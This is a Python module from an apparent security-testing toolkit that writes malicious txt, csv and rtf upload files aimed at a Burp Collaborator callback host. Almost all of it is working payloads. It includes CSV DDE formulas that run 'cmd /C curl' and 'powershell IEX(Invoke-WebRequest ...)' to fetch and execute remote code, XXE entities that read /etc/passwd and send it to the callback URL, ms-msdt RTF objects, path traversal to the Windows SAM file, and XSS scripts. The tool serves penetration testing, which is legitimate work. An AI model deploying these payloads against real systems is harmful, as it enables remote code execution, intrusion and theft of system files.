from pathlib import Path

try:
    from .ssti_filename_generator import generate_ssti_filename_payloads
    from .xss_filename_generator import generate_xss_filename_payloads
except ImportError:
    try:
        from ssti_filename_generator import generate_ssti_filename_payloads
        from xss_filename_generator import generate_xss_filename_payloads
    except ImportError:
        generate_ssti_filename_payloads = None
        generate_xss_filename_payloads = None

def generate_text_payloads(output_dir, ext, burp_collab, tech_filter='all', payload_types=None):
    if payload_types is None:
        payload_types = {'all'}
    
    def should_generate_type(payload_type):
        return 'all' in payload_types or payload_type in payload_types
    output_dir = Path(output_dir)
    base_url = f"http://{burp_collab}"
    
    if ext in ['txt', 'csv', 'rtf']:
        output_dir.mkdir(parents=True, exist_ok=True)
        
        if should_generate_type('xss'):
            xss_dir = output_dir / 'xss'
            xss_dir.mkdir(exist_ok=True)
        if should_generate_type('ssrf'):
            ssrf_dir = output_dir / 'ssrf'
            ssrf_dir.mkdir(exist_ok=True)
        if should_generate_type('xxe'):
            xxe_dir = output_dir / 'xxe'
            xxe_dir.mkdir(exist_ok=True)
        if should_generate_type('path_traversal'):
            path_traversal_dir = output_dir / 'path_traversal'
            path_traversal_dir.mkdir(exist_ok=True)
        if should_generate_type('rce') or should_generate_type('deserialization'):
            rce_dir = output_dir / 'rce'
            rce_dir.mkdir(exist_ok=True)
        
        if should_generate_type('xss'):
            xss1_script = f"<script>alert(1)</script>"
            output_file = xss_dir / f"xss1_script.{ext}"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(xss1_script)
            
            xss2_img = f"<img src=x onerror=alert(1)>"
            output_file = xss_dir / f"xss2_img.{ext}"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(xss2_img)
            
            if ext == 'csv':
                xss3_hyperlink = f'=HYPERLINK("javascript:alert(1)","click")'
                output_file = xss_dir / f"xss3_hyperlink.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(xss3_hyperlink)
                
                xss4_concatenate = f'=HYPERLINK(CONCATENATE("javascript:","alert(1)"),"click")'
                output_file = xss_dir / f"xss4_concatenate.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(xss4_concatenate)
                
                xss5_char_encode = f'=HYPERLINK(CHAR(106)&CHAR(97)&CHAR(118)&CHAR(97)&CHAR(115)&CHAR(99)&CHAR(114)&CHAR(105)&CHAR(112)&CHAR(116)&CHAR(58)&CHAR(97)&CHAR(108)&CHAR(101)&CHAR(114)&CHAR(116)&CHAR(40)&CHAR(49)&CHAR(41),"click")'
                output_file = xss_dir / f"xss5_char_encode.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(xss5_char_encode)
                
                xss6_plus_sign = f'+HYPERLINK("javascript:alert(1)","click")'
                output_file = xss_dir / f"xss6_plus_sign.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(xss6_plus_sign)
                
                xss7_at_sign = f'@HYPERLINK("javascript:alert(1)","click")'
                output_file = xss_dir / f"xss7_at_sign.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(xss7_at_sign)
            
            if ext == 'rtf':
                rtf_xss1_hyperlink = f'''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
\\field{{\\*\\fldinst {{ HYPERLINK "javascript:alert(1)" }}}}{{\\fldrslt Click here}}
}}'''
                output_file = xss_dir / f"xss1_hyperlink.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(rtf_xss1_hyperlink)
                
                rtf_xss2_object = f'''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
{{\\object\\objdata javascript:alert(1)}}
}}'''
                output_file = xss_dir / f"xss2_object.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(rtf_xss2_object)
        
        if should_generate_type('ssrf'):
            ssrf1_http = f"http://{burp_collab}/ssrf-{ext}-1"
            if ext == 'rtf':
                rtf_content = f'''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
\\field{{\\*\\fldinst HYPERLINK "{ssrf1_http}"}}{{\\fldrslt Click here}}
}}'''
                output_file = ssrf_dir / f"ssrf1_hyperlink.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(rtf_content)
            elif ext == 'csv':
                ssrf1_hyperlink = f'=HYPERLINK("http://{burp_collab}/ssrf-csv-hyperlink1","click")'
                output_file = ssrf_dir / f"ssrf1_hyperlink.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(ssrf1_hyperlink)
                
                ssrf2_webservice = f'=WEBSERVICE("http://{burp_collab}/ssrf-csv-webservice1")'
                output_file = ssrf_dir / f"ssrf2_webservice.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(ssrf2_webservice)
                
                ssrf3_importxml = f'=IMPORTXML("http://{burp_collab}/ssrf-csv-importxml1","//")'
                output_file = ssrf_dir / f"ssrf3_importxml.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(ssrf3_importxml)
                
                ssrf4_importdata = f'=IMPORTDATA("http://{burp_collab}/ssrf-csv-importdata1")'
                output_file = ssrf_dir / f"ssrf4_importdata.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(ssrf4_importdata)
                
                ssrf5_filterxml = f'=FILTERXML(WEBSERVICE("http://{burp_collab}/ssrf-csv-filterxml1"),"//")'
                output_file = ssrf_dir / f"ssrf5_filterxml.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(ssrf5_filterxml)
            else:
                output_file = ssrf_dir / f"ssrf1_http.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(ssrf1_http)
            
            ssrf2_https = f"https://{burp_collab}/ssrf-{ext}-2"
            if ext == 'rtf':
                rtf_content = f'''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
\\field{{\\*\\fldinst HYPERLINK "{ssrf2_https}"}}{{\\fldrslt Click here}}
}}'''
                output_file = ssrf_dir / f"ssrf2_hyperlink.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(rtf_content)
            elif ext == 'csv':
                ssrf6_https_hyperlink = f'=HYPERLINK("https://{burp_collab}/ssrf-csv-hyperlink2","click")'
                output_file = ssrf_dir / f"ssrf6_https_hyperlink.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(ssrf6_https_hyperlink)
            else:
                output_file = ssrf_dir / f"ssrf2_https.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(ssrf2_https)
            
            if ext == 'rtf':
                rtf_ssrf3_object = f'''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
{{\\object\\objdata {base_url}/ssrf-rtf-object}}
}}'''
                output_file = ssrf_dir / f"ssrf3_object.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(rtf_ssrf3_object)
                
                rtf_ssrf4_field = f'''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
\\field{{\\*\\fldinst HYPERLINK "{base_url}/ssrf-rtf-field"}}{{\\fldrslt Click}}
}}'''
                output_file = ssrf_dir / f"ssrf4_field.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(rtf_ssrf4_field)
                
                rtf_ssrf5_pict = f'''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
{{\\pict\\picscalex100\\picscaley100\\picwgoal1000\\pichgoal1000 {base_url}/ssrf-rtf-pict}}
}}'''
                output_file = ssrf_dir / f"ssrf5_pict.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(rtf_ssrf5_pict)
            elif ext == 'txt':
                txt_ssrf3_link = f"Link: {base_url}/ssrf-txt-link"
                output_file = ssrf_dir / f"ssrf3_link.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(txt_ssrf3_link)
                
                txt_ssrf4_url = f"URL: https://{burp_collab}/ssrf-txt-url"
                output_file = ssrf_dir / f"ssrf4_url.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(txt_ssrf4_url)
                
                txt_ssrf5_metadata = f"Metadata: <meta http-equiv='refresh' content='0;url={base_url}/ssrf-txt-meta'>"
                output_file = ssrf_dir / f"ssrf5_metadata.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(txt_ssrf5_metadata)
        
        if should_generate_type('xxe'):
            if ext in ['rtf', 'txt']:
                if ext == 'rtf':
                    rtf_xxe1_doctype = f'''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-rtf-1">
]>
<root>&xxe;</root>
}}'''
                    output_file = xxe_dir / f"xxe1_doctype.{ext}"
                    with open(output_file, 'w', encoding='utf-8') as f:
                        f.write(rtf_xxe1_doctype)
                    
                    rtf_xxe2_file = f'''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
}}'''
                    output_file = xxe_dir / f"xxe2_file.{ext}"
                    with open(output_file, 'w', encoding='utf-8') as f:
                        f.write(rtf_xxe2_file)
                    
                    rtf_xxe3_parameter = f'''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "{base_url}/xxe-rtf-param">
%xxe;
]>
<root>test</root>
}}'''
                    output_file = xxe_dir / f"xxe3_parameter.{ext}"
                    with open(output_file, 'w', encoding='utf-8') as f:
                        f.write(rtf_xxe3_parameter)
                    
                    rtf_xxe4_nested = f'''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "{base_url}/xxe-rtf-nested">
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{base_url}/xxe-rtf-exfil?data=%file;'>">
%remote;
%eval;
%exfil;
]>
<root>test</root>
}}'''
                    output_file = xxe_dir / f"xxe4_nested.{ext}"
                    with open(output_file, 'w', encoding='utf-8') as f:
                        f.write(rtf_xxe4_nested)
                    
                    rtf_xxe5_php = f'''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource={base_url}/xxe-rtf-php">
]>
<root>&xxe;</root>
}}'''
                    output_file = xxe_dir / f"xxe5_php.{ext}"
                    with open(output_file, 'w', encoding='utf-8') as f:
                        f.write(rtf_xxe5_php)
                elif ext == 'txt':
                    txt_xxe1_doctype = f'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-txt-1">
]>
<root>&xxe;</root>'''
                    output_file = xxe_dir / f"xxe1_doctype.{ext}"
                    with open(output_file, 'w', encoding='utf-8') as f:
                        f.write(txt_xxe1_doctype)
                    
                    txt_xxe2_file = f'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'''
                    output_file = xxe_dir / f"xxe2_file.{ext}"
                    with open(output_file, 'w', encoding='utf-8') as f:
                        f.write(txt_xxe2_file)
                    
                    txt_xxe3_parameter = f'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "{base_url}/xxe-txt-param">
%xxe;
]>
<root>test</root>'''
                    output_file = xxe_dir / f"xxe3_parameter.{ext}"
                    with open(output_file, 'w', encoding='utf-8') as f:
                        f.write(txt_xxe3_parameter)
                    
                    txt_xxe4_nested = f'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "{base_url}/xxe-txt-nested">
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{base_url}/xxe-txt-exfil?data=%file;'>">
%remote;
%eval;
%exfil;
]>
<root>test</root>'''
                    output_file = xxe_dir / f"xxe4_nested.{ext}"
                    with open(output_file, 'w', encoding='utf-8') as f:
                        f.write(txt_xxe4_nested)
                    
                    txt_xxe5_php = f'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource={base_url}/xxe-txt-php">
]>
<root>&xxe;</root>'''
                    output_file = xxe_dir / f"xxe5_php.{ext}"
                    with open(output_file, 'w', encoding='utf-8') as f:
                        f.write(txt_xxe5_php)
            elif ext == 'csv':
                xxe1_filterxml = f'=FILTERXML(WEBSERVICE("http://{burp_collab}/xxe-csv-filterxml1"),"//entity")'
                output_file = xxe_dir / f"xxe1_filterxml.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(xxe1_filterxml)
                
                xxe2_xml_header = f'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe-csv-xml1">
]>
<root>&xxe;</root>'''
                output_file = xxe_dir / f"xxe2_xml_header.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(xxe2_xml_header)
                
                xxe3_importxml_entity = f'=IMPORTXML("http://{burp_collab}/xxe-csv-importxml1","//entity")'
                output_file = xxe_dir / f"xxe3_importxml_entity.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(xxe3_importxml_entity)
                
                xxe4_file_protocol = f'=FILTERXML(WEBSERVICE("file:///etc/passwd"),"//")'
                output_file = xxe_dir / f"xxe4_file_protocol.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(xxe4_file_protocol)
                
                xxe5_webservice_param = f'=WEBSERVICE("http://{burp_collab}/xxe-csv-webservice1")'
                output_file = xxe_dir / f"xxe5_webservice_param.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(xxe5_webservice_param)
        
        if should_generate_type('path_traversal'):
            path1_relative = "../../../etc/passwd"
            output_file = path_traversal_dir / f"path1_relative.{ext}"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(path1_relative)
            
            path2_windows = "..\\..\\..\\windows\\system32\\config\\sam"
            output_file = path_traversal_dir / f"path2_windows.{ext}"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(path2_windows)
            
            path3_double = "....//....//....//etc/passwd"
            output_file = path_traversal_dir / f"path3_double.{ext}"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(path3_double)
        
        if should_generate_type('rce') or should_generate_type('deserialization'):
            if ext == 'csv':
                rce5_dde_cmd = f'DDE ("cmd";"/C curl {base_url}/rce-csv-dde1";"!A0")A0'
                output_file = rce_dir / f"rce5_dde_cmd.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(rce5_dde_cmd)
                
                rce6_dde_sum = f'@SUM(1+9)*cmd|\' /C curl {base_url}/rce-csv-dde2\'!A0'
                output_file = rce_dir / f"rce6_dde_sum.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(rce6_dde_sum)
                
                rce7_dde_calc = f'=10+20+cmd|\' /C curl {base_url}/rce-csv-dde3\'!A0'
                output_file = rce_dir / f"rce7_dde_calc.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(rce7_dde_calc)
                
                rce8_dde_notepad = f'=cmd|\' /C curl {base_url}/rce-csv-dde4\'!\'A1\''
                output_file = rce_dir / f"rce8_dde_notepad.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(rce8_dde_notepad)
                
                rce9_dde_powershell = f'=cmd|\'/C powershell IEX(Invoke-WebRequest {base_url}/rce-csv-dde5)\'!A0'
                output_file = rce_dir / f"rce9_dde_powershell.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(rce9_dde_powershell)
                
                rce10_dde_rundll32 = f'=cmd|\'/c curl {base_url}/rce-csv-dde6\'!_xlbgnm.A1'
                output_file = rce_dir / f"rce10_dde_rundll32.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(rce10_dde_rundll32)
            elif ext == 'rtf':
                rtf_rce1_object_cmd = f'''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
{{\\object\\objdata cmd:///c curl {base_url}/rce-rtf-cmd}}
}}'''
                output_file = rce_dir / f"rce1_object_cmd.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(rtf_rce1_object_cmd)
                
                rtf_rce2_field_ps = f'''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
\\field{{\\*\\fldinst HYPERLINK "powershell://Invoke-WebRequest {base_url}/rce-rtf-ps"}}{{\\fldrslt Click}}
}}'''
                output_file = rce_dir / f"rce2_field_ps.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(rtf_rce2_field_ps)
                
                rtf_rce3_ole = f'''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
{{\\object\\objocx {base_url}/rce-rtf-ole}}
}}'''
                output_file = rce_dir / f"rce3_ole.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(rtf_rce3_ole)
                
                rtf_rce4_embedded = f'''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
{{\\object\\objdata javascript:fetch('{base_url}/rce-rtf-js')}}
}}'''
                output_file = rce_dir / f"rce4_embedded.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(rtf_rce4_embedded)
                
                rtf_rce5_macro = f'''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
{{\\object\\objdata ms-msdt:id /moreinfo linkTag={base_url}/rce-rtf-msdt}}
}}'''
                output_file = rce_dir / f"rce5_macro.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(rtf_rce5_macro)
            elif ext == 'txt':
                txt_rce1_script = f"<script>fetch('{base_url}/rce-txt-js')</script>"
                output_file = rce_dir / f"rce1_script.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(txt_rce1_script)
                
                txt_rce2_eval = f"<script>eval('fetch(\\'{base_url}/rce-txt-eval\\')')</script>"
                output_file = rce_dir / f"rce2_eval.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(txt_rce2_eval)
                
                txt_rce3_function = f"<script>Function('fetch(\\'{base_url}/rce-txt-function\\')')()</script>"
                output_file = rce_dir / f"rce3_function.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(txt_rce3_function)
                
                txt_rce4_import = f"<script type='module'>import('{base_url}/rce-txt-import')</script>"
                output_file = rce_dir / f"rce4_import.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(txt_rce4_import)
                
                txt_rce5_worker = f"<script>var w=new Worker('{base_url}/rce-txt-worker');w.onmessage=()=>fetch('{base_url}/rce-txt-worker?exec=true')</script>"
                output_file = rce_dir / f"rce5_worker.{ext}"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(txt_rce5_worker)
        
        if should_generate_type('xss') or should_generate_type('ssrf') or should_generate_type('xxe') or should_generate_type('path_traversal') or should_generate_type('rce') or should_generate_type('deserialization'):
            master_parts = []
            if should_generate_type('xss'):
                if ext == 'csv':
                    master_parts.append('=HYPERLINK("javascript:alert(1)","click")')
                else:
                    master_parts.append("<script>alert(1)</script>")
            if should_generate_type('ssrf'):
                if ext == 'csv':
                    master_parts.append(f'=HYPERLINK("http://{burp_collab}/ssrf-csv-hyperlink1","click")')
                else:
                    master_parts.append(f"http://{burp_collab}/ssrf-{ext}-1")
            if should_generate_type('xxe'):
                if ext == 'csv':
                    master_parts.append(f'=FILTERXML(WEBSERVICE("http://{burp_collab}/xxe-csv-filterxml1"),"//entity")')
            if should_generate_type('path_traversal'):
                master_parts.append("../../../etc/passwd")
            if should_generate_type('rce') or should_generate_type('deserialization'):
                if ext == 'csv':
                    master_parts.append(f'DDE ("cmd";"/C curl {base_url}/rce-csv-dde1";"!A0")A0')
            
            if master_parts:
                master_file = output_dir / f"master.{ext}"
                master_content = "\n".join(master_parts)
                with open(master_file, 'w', encoding='utf-8') as f:
                    f.write(master_content)
        
        if generate_ssti_filename_payloads and should_generate_type('ssti'):
            generate_ssti_filename_payloads(output_dir, ext, burp_collab, tech_filter)
        
        if generate_xss_filename_payloads and should_generate_type('xss'):
            generate_xss_filename_payloads(output_dir, ext, burp_collab, tech_filter)
